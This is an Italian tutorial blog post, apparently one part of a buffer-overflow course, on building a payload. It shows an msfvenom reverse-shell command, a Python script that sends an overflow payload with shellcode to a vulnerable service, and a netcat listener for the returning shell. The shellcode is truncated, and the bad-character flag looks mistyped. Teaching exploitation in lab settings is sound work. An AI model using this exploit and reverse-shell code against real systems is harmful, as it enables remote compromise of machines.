---
layout: post
title:  "Corso Buffer Overflow: Creazione del Payload"
date:   2024-09-08 14:00:00 +0200
categories: buffer-overflow
tags: [buffer-overflow, payload, exploit]
---

# Corso Buffer Overflow: Creazione del Payload

Nella fase precedente, abbiamo determinato l'**offset** corretto per sovrascrivere l'EIP. Ora siamo pronti a creare un **payload** che ci consenta di sfruttare il buffer overflow e ottenere l'esecuzione del nostro codice arbitrario.

In questa fase, utilizzeremo **msfvenom** per creare il nostro payload e lo invieremo al programma vulnerabile.

## Strumenti richiesti

- **msfvenom**: Strumento di Metasploit per generare shellcode.
- **Netcat**: Per ascoltare la connessione di ritorno.

## 1. Generazione del Payload con msfvenom

Utilizzeremo **msfvenom** per generare uno **shellcode** che ci fornisca una **reverse shell**. Ecco il comando per generare il payload:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<TUO_IP> LPORT=<TUO_PORT> -b " " -f c
```

- **`-p windows/shell_reverse_tcp`**: Specifichiamo il tipo di payload, in questo caso una reverse shell per Windows.
- **`LHOST=<TUO_IP>`**: Sostituisci `<TUO_IP>` con il tuo indirizzo IP locale.
- **`LPORT=<TUO_PORT>`**: Sostituisci `<TUO_PORT>` con una porta aperta sul tuo sistema.
- **`-b " "`**: Questo elimina i caratteri nulli (` `) che potrebbero interrompere il payload.
- **`-f c`**: Formato del payload in linguaggio C.

### Output del comando:

Dopo aver eseguito il comando, riceverai uno shellcode simile a questo:

```c
"ÚÄÙt$ôº$-F..."
```

Copia lo shellcode generato e preparati ad aggiungerlo al tuo exploit.

## 2. Modifica dello script di exploit

Ora che abbiamo il nostro shellcode, modifichiamo lo script Python per includere l'offset che abbiamo trovato e il nostro payload:

```python
import socket

ip = "192.168.1.100"
port = 9999

# Offset trovato dall'analisi precedente
offset = 524

# Shellcode generato con msfvenom
shellcode = (
    "ÚÄÙt$ôº$-F..."
)

# Creazione del payload
payload = "A" * offset
payload += "B" * 4  # Questo sarà l'indirizzo di ritorno (EIP) che sostituiremo in seguito
payload += shellcode

# Invio del payload al programma vulnerabile
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(bytes(payload, 'latin-1'))
s.close()
```

### 3. Esecuzione del payload

Dopo aver creato lo script, esegui il codice per inviare il payload al programma vulnerabile.

```bash
python3 exploit.py
```

## 4. Attendere la connessione

Prima di eseguire lo script, assicurati di essere in ascolto sulla porta specificata. Puoi farlo usando **Netcat**:

```bash
nc -lvnp <TUO_PORT>
```

Se tutto va a buon fine, otterrai una **reverse shell** e potrai eseguire comandi sulla macchina compromessa.

## Prossimi Passi

Nella prossima parte parleremo di come gestire e bypassare protezioni come DEP e ASLR per eseguire il nostro shellcode in sistemi protetti.

